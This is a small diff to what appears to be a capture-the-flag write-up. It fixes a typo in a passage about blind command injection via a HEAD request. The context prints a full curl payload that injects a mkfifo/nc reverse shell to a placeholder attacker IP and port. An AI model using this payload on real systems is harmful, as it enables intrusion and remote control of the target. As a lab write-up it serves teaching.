@@ -43,5 +43,5 @@ so if we make use of another request method like HEAD, which is a request method
 
 so the payload used was  ```curl -I http://url/?c=`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <attacker IP> <port> >/tmp/f` ``` this payload was used beacuse it was a blind command injection
 .
-This we get us a reverse shell and we can get the flag
+This will get us a reverse shell and we can get the flag
       
